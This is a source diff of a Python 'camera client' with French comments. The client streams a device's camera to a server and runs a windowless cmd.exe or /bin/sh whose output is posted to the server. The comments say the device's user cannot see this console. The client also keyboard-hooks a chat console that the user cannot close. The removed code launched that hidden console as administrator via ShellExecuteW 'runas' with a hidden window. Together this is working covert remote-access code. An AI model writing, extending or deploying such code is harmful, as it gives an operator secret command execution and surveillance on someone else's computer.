@@ -10,25 +10,19 @@ Fonctionnalités (toutes indépendantes) :
   - CMD Commandes : console cmd.exe PERSISTANTE, SANS FENÊTRE, dont
     stdout/stderr sont redirigés vers server_gui (comme les frames caméra).
     L'utilisateur du client ne la voit pas. Seul server_gui y écrit.
-    >>> CORRECTIF v9 : sous Windows, cette console est lancée EN
-    ADMINISTRATEUR via ShellExecuteW("runas", SW_HIDE). UAC demandé une
-    fois à l'ouverture. Redirection via fichiers (input.txt/output.txt).
   - Chat : vraie console cmd.exe VISIBLE chez le client, avec capture des
     frappes via hook clavier (Solution B — préfixe invisible). Le [X] est
     neutralisé ; seul server_gui peut fermer la console.
 
-Compatible Windows et Linux (le chat n'est actif que sous Windows,
-l'élévation admin du CMD Commandes n'a de sens que sous Windows).
+Compatible Windows et Linux (le chat n'est actif que sous Windows).
 
-CORRECTIFS v8 (rappel) :
+CORRECTIFS v8 :
   - _handle_user_chat : l'écho local "Toi: <msg>" est injecté AVANT
-    l'envoi réseau.
-  - _send_text n'a plus de paramètre force.
-
-CORRECTIFS v9 :
-  - RemoteConsole utilise ElevatedConsole sous Windows (cmd.exe admin
-    invisible via ShellExecuteW runas + redirection fichiers).
-  - Sous Linux, comportement inchangé (/bin/sh -i via pipes).
+    l'envoi réseau (retour visuel immédiat). L'injection passe par
+    _send_text (AttachConsole + WriteConsoleInputW, voir console_windows.py),
+    qui ne vole pas le focus et n'est pas capté par le hook.
+  - _send_text n'a plus de paramètre force : l'injection est toujours
+    directe et déterministe.
 """
 
 import argparse
@@ -106,10 +100,6 @@ MOUSE_SEND_INTERVAL = 0.1
 SHELL_STREAM_MIN_INTERVAL = 0.05
 SHELL_STREAM_CHUNK = 4096
 SHELL_STREAM_BUFFER_MAX = 16384
-
-# --- CMD Commandes élevé (Windows) ---
-ELEVATED_TAIL_INTERVAL = 0.1
-ELEVATED_CMD_TITLE = "CmdAdminRemote"
 
 
 def _app_dir() -> Path:
@@ -478,250 +468,7 @@ class _RateLimiter:
             return slot - now
 
 
-# =====================================================================
-# CMD Commandes : console ÉLEVÉE (admin) invisible, Windows uniquement
-# =====================================================================
-
-class ElevatedConsole:
-    """Console cmd.exe persistante, ÉLEVÉE (admin), SANS FENÊTRE, sous Windows.
-
-    Principe :
-      - Un script batch temporaire est écrit dans
-        %LOCALAPPDATA%\\CameraClient\\elevated_cmd\\launch_elevated.bat.
-      - Ce script lance :
-            cmd.exe /k "title CmdAdminRemote" < input.txt >> output.txt 2>&1
-        avec des redirections FICHIERS (ShellExecuteW ne sait pas rediriger
-        de pipes).
-      - Le script est lancé via ShellExecuteW(..., "runas", ..., SW_HIDE)
-        → UAC demandé une seule fois à l'ouverture.
-      - Le client tail output.txt en continu et pousse les nouveaux octets
-        vers /api/shell/output (comme un pipe).
-      - write_command() append dans input.txt ; le cmd.exe élevé le lit
-        via sa redirection stdin persistante.
-    """
-
-    def __init__(self, server_url: str, device_id: str):
-        self.server_url = server_url
-        self.device_id = device_id
-        self._stop = threading.Event()
-        self._threads: list[threading.Thread] = []
-        self._write_lock = threading.Lock()
-        self._send_queue: "queue.Queue[str]" = queue.Queue(maxsize=200)
-
-        self._work_dir = APP_DIR / "elevated_cmd"
-        self._work_dir.mkdir(parents=True, exist_ok=True)
-        self._in_path = self._work_dir / "input.txt"
-        self._out_path = self._work_dir / "output.txt"
-        self._bat_path = self._work_dir / "launch_elevated.bat"
-        self._read_pos = 0
-        self._launched = False
-
-    # ------------------------------------------------------------------
-    def _alive_marker_ok(self) -> bool:
-        """Vérifie qu'un process avec notre titre de fenêtre unique tourne.
-        La fenêtre est cachée (SW_HIDE) mais reste énumérable."""
-        if platform.system() != "Windows":
-            return False
-        try:
-            import ctypes
-            import ctypes.wintypes
-            user32 = ctypes.windll.user32
-            found = [False]
-
-            @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
-            def enum_proc(hwnd, _):
-                length = user32.GetWindowTextLengthW(hwnd)
-                if length > 0:
-                    buf = ctypes.create_unicode_buffer(length + 1)
-                    user32.GetWindowTextW(hwnd, buf, length + 1)
-                    if buf.value == ELEVATED_CMD_TITLE:
-                        found[0] = True
-                        return False
-                return True
-
-            user32.EnumWindows(enum_proc, 0)
-            return found[0]
-        except Exception:
-            return False
-
-    # ------------------------------------------------------------------
-    def is_running(self) -> bool:
-        return self._launched and self._alive_marker_ok()
-
-    # ------------------------------------------------------------------
-    def start(self) -> bool:
-        if platform.system() != "Windows":
-            return False
-        if self.is_running():
-            return True
-
-        try:
-            self._in_path.write_text("", encoding="utf-8")
-            self._out_path.write_text("", encoding="utf-8")
-        except OSError as exc:
-            logger.error("Impossible d'initialiser les fichiers CMD élevé : %s", exc)
-            return False
-        self._read_pos = 0
-
-        bat = (
-            "@echo off\r\n"
-            f'cmd.exe /k "title {ELEVATED_CMD_TITLE}" '
-            f'< "{self._in_path}" >> "{self._out_path}" 2>&1\r\n'
-        )
-        try:
-            self._bat_path.write_text(bat, encoding="utf-8")
-        except OSError as exc:
-            logger.error("Impossible d'écrire le script CMD élevé : %s", exc)
-            return False
-
-        try:
-            import ctypes
-            import ctypes.wintypes
-            shell32 = ctypes.windll.shell32
-            shell32.ShellExecuteW.restype = ctypes.wintypes.HINSTANCE
-            shell32.ShellExecuteW.argtypes = [
-                ctypes.wintypes.HWND, ctypes.wintypes.LPCWSTR,
-                ctypes.wintypes.LPCWSTR, ctypes.wintypes.LPCWSTR,
-                ctypes.wintypes.LPCWSTR, ctypes.c_int,
-            ]
-            ret = shell32.ShellExecuteW(
-                None, "runas", str(self._bat_path), None, str(self._work_dir), 0,
-            )
-            if int(ret) <= 32:
-                logger.error(
-                    "Lancement CMD élevé refusé (code %s). Élévation UAC refusée ?",
-                    int(ret),
-                )
-                return False
-        except Exception as exc:
-            logger.error("Impossible de lancer le CMD élevé : %s", exc)
-            return False
-
-        deadline = time.time() + 5.0
-        while time.time() < deadline:
-            if self._alive_marker_ok():
-                break
-            time.sleep(0.2)
-        else:
-            logger.warning(
-                "Le CMD élevé n'a pas démarré dans les 5 s. Vérifiez que l'UAC "
-                "a été accepté et que le titre '%s' apparaît.",
-                ELEVATED_CMD_TITLE,
-            )
-            return False
-
-        self._launched = True
-        self._stop.clear()
-        self._threads = [
-            threading.Thread(target=self._tail_loop, daemon=True),
-            threading.Thread(target=self._sender_loop, daemon=True),
-        ]
-        for t in self._threads:
-            t.start()
-        logger.info("CMD élevé (admin) démarré — fichiers : %s", self._work_dir)
-        return True
-
-    # ------------------------------------------------------------------
-    def stop(self) -> None:
-        self._stop.set()
-        self._launched = False
-        # Tue le cmd.exe élevé ciblé par titre (sans toucher aux autres cmd.exe).
-        try:
-            subprocess.run(
-                ["taskkill", "/F", "/FI", f"WINDOWTITLE eq {ELEVATED_CMD_TITLE}"],
-                capture_output=True, timeout=5,
-                creationflags=subprocess.CREATE_NO_WINDOW,
-            )
-        except Exception:
-            pass
-        for t in self._threads:
-            t.join(timeout=2)
-        self._threads = []
-        for p in (self._in_path, self._out_path, self._bat_path):
-            try:
-                p.unlink()
-            except OSError:
-                pass
-        logger.info("CMD élevé arrêté")
-
-    # ------------------------------------------------------------------
-    def write_command(self, command: str) -> None:
-        if not self.is_running():
-            return
-        try:
-            with self._write_lock:
-                with open(self._in_path, "a", encoding="utf-8", newline="") as f:
-                    f.write(command + "\r\n")
-                    f.flush()
-                    os.fsync(f.fileno())
-        except Exception as exc:
-            logger.warning("Écriture CMD élevé impossible : %s", exc)
-
-    # ------------------------------------------------------------------
-    def _tail_loop(self) -> None:
-        """Lit les nouveaux octets de output.txt et les pousse dans la file."""
-        while not self._stop.is_set():
-            try:
-                size = self._out_path.stat().st_size
-                if size < self._read_pos:
-                    self._read_pos = 0  # troncature (relance)
-                if size > self._read_pos:
-                    with open(self._out_path, "rb") as f:
-                        f.seek(self._read_pos)
-                        data = f.read(size - self._read_pos)
-                    self._read_pos = size
-                    if data:
-                        text = data.decode("utf-8", errors="replace")
-                        try:
-                            self._send_queue.put_nowait(text)
-                        except queue.Full:
-                            pass
-            except FileNotFoundError:
-                pass
-            except Exception:
-                pass
-            self._stop.wait(ELEVATED_TAIL_INTERVAL)
-
-    def _sender_loop(self) -> None:
-        session = requests.Session()
-        last_send = 0.0
-        pending = ""
-        while not self._stop.is_set():
-            try:
-                chunk = self._send_queue.get(timeout=0.2)
-                pending += chunk
-            except queue.Empty:
-                pass
-            now = time.monotonic()
-            if pending and (now - last_send) >= SHELL_STREAM_MIN_INTERVAL:
-                try:
-                    session.post(
-                        f"{self.server_url}/api/shell/output",
-                        json={
-                            "device_id": self.device_id,
-                            "chunk": pending[-SHELL_STREAM_BUFFER_MAX:],
-                        },
-                        timeout=5,
-                    )
-                    pending = ""
-                    last_send = now
-                except requests.RequestException:
-                    pass
-        if pending:
-            try:
-                session.post(
-                    f"{self.server_url}/api/shell/output",
-                    json={"device_id": self.device_id, "chunk": pending},
-                    timeout=5,
-                )
-            except requests.RequestException:
-                pass
-
-
-class _PipeConsole:
-    """Ancienne implémentation pipe — Linux uniquement désormais.
-    Comportement strictement identique à la version précédente."""
-
+class RemoteConsole:
     def __init__(self, server_url: str, device_id: str):
         self.server_url = server_url
         self.device_id = device_id
@@ -734,13 +481,20 @@ class _PipeConsole:
     def start(self) -> bool:
         if self.process is not None and self.process.poll() is None:
             return True
-        argv = ["/bin/sh", "-i"]
+        if platform.system() == "Windows":
+            creationflags = subprocess.CREATE_NO_WINDOW
+            argv = ["cmd.exe"]
+        else:
+            creationflags = 0
+            argv = ["/bin/sh", "-i"]
+
         try:
             self.process = subprocess.Popen(
                 argv,
                 stdin=subprocess.PIPE,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
+                creationflags=creationflags,
                 bufsize=0,
             )
         except Exception as exc:
@@ -784,9 +538,7 @@ class _PipeConsole:
             return
         try:
             with self._write_lock:
-                self.process.stdin.write(
-                    (command + "\r\n").encode("utf-8", errors="replace")
-                )
+                self.process.stdin.write((command + "\r\n").encode("utf-8", errors="replace"))
                 self.process.stdin.flush()
         except Exception as exc:
             logger.warning("Écriture console impossible : %s", exc)
@@ -834,10 +586,7 @@ class _PipeConsole:
                 try:
                     session.post(
                         f"{self.server_url}/api/shell/output",
-                        json={
-                            "device_id": self.device_id,
-                            "chunk": pending[-SHELL_STREAM_BUFFER_MAX:],
-                        },
+                        json={"device_id": self.device_id, "chunk": pending[-SHELL_STREAM_BUFFER_MAX:]},
                         timeout=5,
                     )
                     pending = ""
@@ -854,30 +603,6 @@ class _PipeConsole:
             except requests.RequestException:
                 pass
 
-
-class RemoteConsole:
-    """Façade : ElevatedConsole sous Windows (admin invisible),
-    _PipeConsole sous Linux (comportement inchangé)."""
-
-    def __init__(self, server_url: str, device_id: str):
-        self.server_url = server_url
-        self.device_id = device_id
-        if platform.system() == "Windows":
-            self._impl = ElevatedConsole(server_url, device_id)
-        else:
-            self._impl = _PipeConsole(server_url, device_id)
-
-    def start(self) -> bool:
-        return self._impl.start()
-
-    def stop(self) -> None:
-        self._impl.stop()
-
-    def is_running(self) -> bool:
-        return self._impl.is_running()
-
-    def write_command(self, command: str) -> None:
-        self._impl.write_command(command)
 
 class CameraClient:
     def __init__(self, server_url: str, device_id: str, device_name: str):
@@ -996,7 +721,9 @@ class CameraClient:
         if shell_input and self._remote_console.is_running():
             self._remote_console.write_command(shell_input.get("text", ""))
 
-        # Chat : cycle de vie AVANT les messages.
+        # ------------------------------------------------------------------
+        # Chat : CYCLE DE VIE **AVANT** LES MESSAGES.
+        # ------------------------------------------------------------------
         chat_window_cmd = commands.get("chat_window")
         if self._chat_console is not None:
             try:
@@ -1016,6 +743,11 @@ class CameraClient:
                 logger.exception("Erreur lors de l'injection du message chat : %s", exc)
 
     def _handle_user_chat(self, line: str) -> None:
+        """Appelée par le thread dispatcher de ChatConsole (PAS par le hook).
+        On affiche l'écho local immédiatement (retour visuel rapide), puis
+        on envoie au serveur. L'injection passe par _send_text, qui utilise
+        AttachConsole + WriteConsoleInputW : pas de focus volé, pas de
+        capture par le hook."""
         try:
             if self._chat_console is not None and self._chat_console.is_open():
                 safe = (
